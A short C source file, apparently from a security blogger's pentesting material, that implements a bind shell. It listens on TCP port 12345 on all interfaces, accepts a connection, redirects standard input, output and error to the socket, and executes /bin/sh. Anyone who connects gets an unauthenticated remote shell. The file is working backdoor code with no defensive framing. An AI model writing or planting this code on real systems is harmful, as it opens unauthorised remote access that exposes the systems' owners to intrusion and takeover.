/*
Author: Daniel Sauder
Website: http://govolution.wordpress.com/about
License http://creativecommons.org/licenses/by-sa/3.0/
*/

#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) 
{
   int sockfd, new_sockfd;  
   struct sockaddr_in host_addr, client_addr; 
   socklen_t sin_size;
   int yes=1;

   sockfd = socket(PF_INET, SOCK_STREAM, 0);
   
   host_addr.sin_family = AF_INET;        
   host_addr.sin_port = htons(12345);    
   host_addr.sin_addr.s_addr = INADDR_ANY; 
   memset(&(host_addr.sin_zero), '\0', 8); 

   bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

   listen(sockfd, 4);

   sin_size = sizeof(struct sockaddr_in);
   new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);

   dup2(new_sockfd,0);
   dup2(new_sockfd,1);
   dup2(new_sockfd,2);
   execve("/bin/sh", NULL, NULL);
}
